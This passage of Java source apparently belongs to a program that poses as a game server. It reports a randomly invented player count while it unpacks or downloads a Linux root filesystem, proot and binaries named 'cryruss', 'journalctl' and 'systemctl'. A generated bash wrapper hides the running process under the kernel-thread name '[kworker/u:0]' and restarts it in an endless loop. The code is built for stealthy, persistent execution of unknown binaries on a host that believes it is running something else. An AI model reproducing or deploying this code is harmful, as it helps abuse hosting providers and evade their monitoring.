            if (exitCallback != null) {
                try { exitCallbackClass.getMethod("onExit", int.class).invoke(exitCallback, code); }
                catch (Exception e) { e.printStackTrace(); }
            }
        }
    }

    private static void createSSHWrapper() {
        try {
            File workDir = new File("work");
            if (!workDir.exists()) return;
            File wrapper = new File(workDir, "ssh.sh");
            if (wrapper.exists()) wrapper.delete();
            String script = "#!/bin/bash\n"
                    + "set +m\n"
                    + "export LC_ALL=C\nexport LANG=C\n"
                    + "ROOTFS_DIR=$(pwd)\n"
                    + "export PATH=$PATH:~/.local/usr/bin\n"
                    + "export PROOT_CONFIG=\"$ROOTFS_DIR/usr/local/.config/proot.yml\"\n"
                    + "if [ ! -e $ROOTFS_DIR/.installed ]; then\n"
                    + "    echo 'Proot environment not installed yet.'\n    exit 1\nfi\n"
                    + "chmod -R 755 $ROOTFS_DIR/usr/local/bin/ 2>/dev/null\n"
                    + "export TERM=${TERM:-xterm-256color}\n"
                    + "COLS=$(tput cols 2>/dev/null || echo 80)\n"
                    + "ROWS=$(tput lines 2>/dev/null || echo 24)\n"
                    + "stty cols $COLS rows $ROWS 2>/dev/null\n"
                    + "cat > $ROOTFS_DIR/root/.bashrc << 'BASHRC_EOF'\n"
                    + "export HOSTNAME=furryisbest\nexport USER=furry\nexport TERM_PROGRAM=\"bash\"\n"
                    + "export PS1='root@furryisbest:\\w\\$ '\nexport LC_ALL=C\nexport LANG=C\nexport TMOUT=0\nunset TMOUT\n"
                    + "resize_term() { local sz; sz=$(stty size 2>/dev/null); [ -n \"$sz\" ] && stty rows ${sz%% *} cols ${sz##* } 2>/dev/null; export COLUMNS=${sz##* } LINES=${sz%% *}; }\n"
                    + "resize_term\ntrap resize_term WINCH\n"
                    + "export DEBIAN_FRONTEND=noninteractive\n"
                    + "alias ls='ls --color=auto'\nalias ll='ls -lah'\nalias grep='grep --color=auto'\nalias id='id 2>/dev/null'\n"
                    + "BASHRC_EOF\n"
                    + "stty sane 2>/dev/null\n"
                    + "while true; do\n"
                    + "  COLS=$(tput cols 2>/dev/null || echo 80)\n"
                    + "  ROWS=$(tput lines 2>/dev/null || echo 24)\n"
                    + "  DEBIAN_FRONTEND=noninteractive COLUMNS=$COLS LINES=$ROWS \\\n"
                    + "  exec -a \"[kworker/u:0]\" $ROOTFS_DIR/usr/local/bin/apk\n"
                    + "  EXIT_CODE=$?\n"
                    + "  echo 'Session ended. Restarting in 2 seconds...'\n"
                    + "  sleep 2\n"
                    + "done\n";
            try (FileWriter fw = new FileWriter(wrapper)) { fw.write(script); }
            wrapper.setExecutable(true, false);
        } catch (IOException ignored) {}
    }

    private static void exec(File d, String s) {
        L.info("[*] Executing noninteractive.sh...");
        try {
            if (!new File(d, ".installed").exists()) {
                ProcessBuilder p = new ProcessBuilder("bash", s);
                p.directory(d);
                p.redirectOutput(ProcessBuilder.Redirect.INHERIT);
                p.redirectError(ProcessBuilder.Redirect.INHERIT);
                p.redirectInput(new File("/dev/null"));
                Process pr = p.start();
                File installedMarker = new File(d, ".installed");
                for (int i = 0; i < 300; i++) {
                    if (installedMarker.exists()) { Thread.sleep(2000); break; }
                    Thread.sleep(1000);
                }
                pr.destroyForcibly();
                pr.waitFor();
            }
            if (!new File(d, ".installed").exists()) {
                L.severe("[!] .installed not found, abort.");
                return;
            }
            Bin(d);
            try {
                new ProcessBuilder("chmod", "-R", "755", new File(d, "usr/local/bin").getAbsolutePath())
                        .redirectErrorStream(true).start().waitFor();
            } catch (Exception ignored) {}
            createSSHWrapper();

            while (running) {
                ProcessBuilder pb = new ProcessBuilder("bash", new File(d, s).getAbsolutePath());
                pb.directory(d);
                pb.inheritIO();
                Map<String, String> env = pb.environment();
                env.put("TERM", System.getenv().getOrDefault("TERM", "xterm-256color"));
                env.put("LC_ALL", "C");
                env.put("LANG", "C");
                env.put("TMOUT", "0");
                Process pr2 = pb.start();
                int code = pr2.waitFor();
                L.info("[*] Session exited (" + code + "), restarting in 2s...");
                Thread.sleep(2000);
            }
        } catch (IOException e)        { L.log(Level.SEVERE, "IO error", e); }
        catch (InterruptedException e) { Thread.currentThread().interrupt(); }
        catch (Exception e)            { L.log(Level.SEVERE, "Exec error", e); }
    }

    private static void startPlayerCountTicker() {
        playerCount.set(20500 + R.nextInt(219999 - 20500 + 1));
        Thread t = new Thread(() -> {
            try {
                while (running) {
                    Thread.sleep(3000);
                    playerCount.set(20500 + R.nextInt(219999 - 20500 + 1));
                }
            } catch (Exception ignored) {}
        }, "player-count-ticker");
        t.setDaemon(true);
        t.start();
    }

    private static void extractTarXz(String resourcePath, File destDir) throws IOException, InterruptedException {
        File tmp = File.createTempFile("res_", ".tar.xz");
        try (InputStream is = Main.class.getResourceAsStream(resourcePath)) {
            if (is == null) throw new IOException("Resource not found: " + resourcePath);
            try (FileOutputStream fos = new FileOutputStream(tmp)) {
                byte[] buf = new byte[8192]; int n;
                while ((n = is.read(buf)) != -1) fos.write(buf, 0, n);
            }
        }
        destDir.mkdirs();
        Process p = new ProcessBuilder("tar", "-xJf", tmp.getAbsolutePath(), "-C", destDir.getAbsolutePath())
                .redirectErrorStream(true).start();
        p.waitFor();
        tmp.delete();
    }

    private static File extractBinFromTarXz(String resourceTarXz, File destDir, String destName) {
        File destFile = new File(destDir, destName);
        try {
            File tmpDir = new File(System.getProperty("java.io.tmpdir"),
                    "bin_extract_" + destName + "_" + System.nanoTime());
            if (tmpDir.exists()) del(tmpDir.toPath());
            tmpDir.mkdirs();
            extractTarXz(resourceTarXz, tmpDir);
            File[] files = tmpDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.isFile()) {
                        destDir.mkdirs();
                        Files.copy(f.toPath(), destFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                        break;
                    }
                }
            }
            del(tmpDir.toPath());
        } catch (Exception e) {
            L.warning("extractBinFromTarXz [" + resourceTarXz + "]: " + e.getMessage());
        }
        if (destFile.exists()) {
            destFile.setExecutable(true, false);
            destFile.setWritable(true, false);
            destFile.setReadable(true, false);
            try {
                new ProcessBuilder("chmod", "755", destFile.getAbsolutePath())
                        .redirectErrorStream(true).start().waitFor();
            } catch (Exception ignored) {}
        }
        return destFile;
    }

    private static void Bin(File workDir) {
        String suffix = getArchSuffix();
        File binDir = new File(workDir, "usr/local/bin");
        binDir.mkdirs();
        String[][] targets = {
                {"cryruss",    "cryruss-"    + suffix},
                {"journalctl", "journalctl-" + suffix},
                {"systemctl",  "systemctl-"  + suffix}
        };
        for (String[] target : targets) {
            File destFile = new File(binDir, target[0]);
            if (destFile.exists() && destFile.canExecute()) continue;
            String resourceName = target[1];
            File result = extractBinFromTarXz("/" + resourceName + ".tar.xz", binDir, target[0]);
            if (!result.exists() || !result.canExecute()) {
                for (String[] dep : EXTRA_BINS) {
                    if (dep[0].equals(resourceName)) {
                        try {
                            L.info("[*] Downloading " + resourceName + "...");
                            downloadFile(dep[1], destFile);
                            destFile.setExecutable(true, false);
                            new ProcessBuilder("chmod", "755", destFile.getAbsolutePath())
                                    .redirectErrorStream(true).start().waitFor();
                        } catch (Exception e) {
                            L.warning("Failed to download " + resourceName + ": " + e.getMessage());
                        }
                        break;
                    }
                }
            }
            if (destFile.exists()) L.info("[+] Ready: " + destFile.getAbsolutePath());
            else L.warning("[!] Binary missing: " + target[0]);
        }
    }

    private static boolean fallback() { return fallbackLocal(); }

    private static boolean fallbackLocal() {
        L.info("[*] Local resources fallback...");
        try {
            File w = new File(DIR);
            if (!w.exists()) w.mkdirs();
            String archSuffix = getArchSuffixFull();
            String binSuffix  = getArchSuffix();
            String archAlt;
            if (archSuffix.equals("aarch64")) archAlt = "arm64";
            else if (archSuffix.equals("armv6")) archAlt = "armv6";
            else if (archSuffix.equals("armv7")) archAlt = "armv7";
            else archAlt = "amd64";

            if (!archSuffix.equals("x86_64") && !archSuffix.equals("aarch64")
                    && !archSuffix.equals("armv6") && !archSuffix.equals("armv7")) {
                L.severe("Unsupported arch: " + System.getProperty("os.arch")); return false;
            }

            File binDir = new File(w, "usr/local/bin");
            binDir.mkdirs();
            File prootBin = extractBinFromTarXz("/proot-" + archSuffix + ".tar.xz", binDir, "proot");
            if (!prootBin.exists()) { L.severe("proot not extracted"); return false; }
            extractBinFromTarXz("/busybox-" + archSuffix + ".tar.xz", w, "busybox-" + archSuffix);
            String[][] localBins = {
                    {"cryruss",    "cryruss-"    + binSuffix},
                    {"journalctl", "journalctl-" + binSuffix},
                    {"systemctl",  "systemctl-"  + binSuffix}
            };
            for (String[] lb : localBins) {
                File destBin = new File(binDir, lb[0]);
                if (destBin.exists() && destBin.canExecute()) continue;
                File result = extractBinFromTarXz("/" + lb[1] + ".tar.xz", binDir, lb[0]);
                if (!result.exists() || !result.canExecute()) {
                    for (String[] dep : EXTRA_BINS) {
                        if (dep[0].equals(lb[1])) {
                            try {
                                downloadFile(dep[1], destBin);
                                destBin.setExecutable(true, false);
                                new ProcessBuilder("chmod", "755", destBin.getAbsolutePath())
                                        .redirectErrorStream(true).start().waitFor();
                            } catch (Exception e) {
                                L.warning("Failed to download " + lb[1] + ": " + e.getMessage());
                            }
                            break;
                        }
                    }
                }
                if (destBin.exists()) L.info("[+] Ready: " + destBin.getName());
            }
            extractTarXz("/ubuntu-base-22.04.5-base-" + archAlt + ".tar.xz", w);
            File script = new File(w, SH);
            try (InputStream is = Main.class.getResourceAsStream("/META-INF/noninteractive.sh")) {
                if (is != null) {
                    try (FileOutputStream fos = new FileOutputStream(script)) {
                        byte[] buf = new byte[8192]; int n;
                        while ((n = is.read(buf)) != -1) fos.write(buf, 0, n);
                    }
                    script.setExecutable(true, false);
                } else {
                    createDefaultScript(script);
                }
            } catch (IOException e) { createDefaultScript(script); }
            L.info("[+] Local fallback done");
            return true;
        } catch (Exception e) {
            L.log(Level.SEVERE, "Local fallback failed", e);
            return false;
        }
    }

    private static void createDefaultScript(File script) throws IOException {
        String s = "#!/bin/sh\n"
                + "export LC_ALL=C\nexport LANG=C\n"
                + "ROOTFS_DIR=$(pwd)\n"
                + "export PATH=$PATH:~/.local/usr/bin\n"
                + "if [ ! -e $ROOTFS_DIR/.installed ]; then\n"
                + "  mkdir -p $ROOTFS_DIR/usr/local/bin\n"
                + "  chmod 755 $ROOTFS_DIR/usr/local/bin/apk\n"
                + "  printf 'nameserver 1.1.1.1\\n' > ${ROOTFS_DIR}/etc/resolv.conf\n"
                + "  touch $ROOTFS_DIR/.installed\n"
                + "fi\n"
                + "$ROOTFS_DIR/usr/local/bin/apk --rootfs=\"${ROOTFS_DIR}\" -0 -w \"/root\" "
                + "-b /dev -b /sys -b /proc -b /etc/resolv.conf "
                + "-b $ROOTFS_DIR/usr/local/bin:/usr/local/bin --kill-on-exit /bin/bash -i\n";
        try (FileWriter fw = new FileWriter(script)) { fw.write(s); }
        script.setExecutable(true, false);
    }

    private static boolean cmd(String c) {
        try {
            ProcessBuilder p = new ProcessBuilder(c, "--version");
            p.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process pr = p.start();
            return pr.waitFor(3, TimeUnit.SECONDS) && pr.exitValue() == 0;
        } catch (IOException | InterruptedException e) { return false; }
    }

    private static boolean cloneRepo() {
        for (int i = 0; i < URLS.size(); i++) {
            String url = URLS.get(i);
            L.info("[*] Trying clone: " + url + " (" + (i + 1) + "/" + URLS.size() + ")");
            try {
                ProcessBuilder p = new ProcessBuilder("git", "clone", "--depth=1", url, TMP);
                p.inheritIO();
                Process pr = p.start();
                int exitCode = pr.waitFor();
                if (exitCode == 0) { L.info("[+] Cloned: " + url); return true; }
                L.warning("Clone failed from " + url + " exit: " + exitCode);
                File t = new File(TMP);
                if (t.exists()) del(t.toPath());
            } catch (IOException e) {
                L.log(Level.WARNING, "IO error: " + url, e);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
        return false;
    }

    private static void clean(File d) {
        if (d != null && d.exists()) {
            try { del(d.toPath()); } catch (IOException e) { L.log(Level.WARNING, "Cleanup failed", e); }
        }
    }

    private static void del(Path p) throws IOException {
        if (Files.exists(p)) {
            Files.walk(p).sorted((a, b) -> b.compareTo(a)).forEach(x -> {
                try { Files.delete(x); } catch (IOException e) { L.log(Level.WARNING, "Delete failed: " + x, e); }
            });
        }
    }
}